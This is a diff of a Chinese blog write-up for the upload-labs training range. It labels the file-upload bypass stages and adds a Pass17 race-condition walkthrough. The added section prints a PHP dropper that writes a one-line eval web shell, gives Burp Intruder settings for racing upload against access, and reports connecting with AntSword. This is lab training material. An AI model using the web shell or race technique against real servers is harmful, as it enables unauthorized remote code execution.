@@ -17,7 +17,7 @@ tags: [Web, upload-labs, 靶场实战]
 
 
 
-**Pass01**
+**Pass01---- JS 前端验证绕过**
 
 上传一个3.php发现弹出弹窗, 考察 JS 前端验证绕过
 
@@ -50,11 +50,9 @@ tags: [Web, upload-labs, 靶场实战]
 
 
 
+**Pass02----MIME类型校验绕过**
 
-
-**Pass02**
-
-能上传.jpg图片；改了很久的文件后缀，结果都不行，查看提示发现想错了。本题考查MIME类型校验绕过
+能上传.jpg图片；改了很久的文件后缀，结果都不行，查看提示发现想错了。本题考查MIME类型校验绕过。
 
 ![屏幕截图 2026-09-22 212316](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/09/22/374cdc6133cd8a918e51007851534036-%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-09-22%20212316.png)
 
@@ -649,5 +647,51 @@ a1失败情况：
 
 
 
-**Pass17**
+**Pass17----条件竞争**
 
+创建一个木马脚本`exploit.php`，内容为
+
+```
+<?php file_put_contents('shell.php', '<?php @eval($_REQUEST["cmd"]); ?>'); ?>
+```
+
+然后执行以下任务：
+
+**任务 A：持续上传 `exploit.php`**
+
+1. 在浏览器中上传 `exploit.php`，用 Burp 拦截该请求。
+2. 右键 → **Send to Intruder**。
+3. 在 **Positions** 标签页，清除所有自动标记的 `§`。
+4. 在请求体中随便找一个不影响功能的位置，手动选中一个字符并点击 **Add §**，把它设为攻击点。目的是让 Intruder 有一个可替换的变量来重复发送请求。
+5. ![image-20261023182657778](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/10/23/703dad58047ceb944a71977f4ae44f6d-image-20261023182657778.png)
+6. 在 **Payloads** 标签页，Payload type 选 **Numbers**，From 1 到 10000（数量够大即可）。我写的是1-30000。
+7. 在 **Resource Pool** 中，新建资源池，**Threads 设为 50**。线程不宜过高，否则服务器可能丢弃请求。
+8. 不要点 Start attack，先让配置停留在这里。
+
+**任务 B：持续访问 `exploit.php`**
+
+1. 在浏览器中访问 `http://靶机地址/upload-labs/upload/exploit.php`（根据实际路径调整）。
+
+2. 用 Burp 拦截这个 GET 请求，同样 **Send to Intruder**。
+
+3. 请求体中随便找一个不影响功能的位置，加一个无意义的参数作为攻击点。
+
+   ![image-20261023182823816](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/10/23/e92966d5073d78cdb206bd35b8e010ff-image-20261023182823816.png)
+
+4. Payload 同样设为 **Numbers** 1~30000。
+
+5. 资源池也用高线程配置（建议比任务A高，我写80；最初写50的时候全部404）。
+
+
+
+然后**先后**点击任务A，任务B界面的“开始攻击”（手速要快），等待结果。当看到任务B出现3-4个状态码为200的请求时即可停止攻击。（有可能出现包虽然也是 200 的状态码，但是还没有成功的情况）
+
+![image-20261023183421319](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/10/23/26b827e8a8adc7ea4fc60964ec5dd182-image-20261023183421319.png)
+
+到上传目录中查看，发现目标文件`shell.php`。
+
+![image-20261023183510113](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/10/23/66fffb250217f2c87393f0e938b49b0f-image-20261023183510113.png)
+
+蚁剑尝试连接，成功。
+
+![image-20261023183705627](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/10/23/ecb6ecdb7b871ade05ed5d96a988f37b-image-20261023183705627.png)
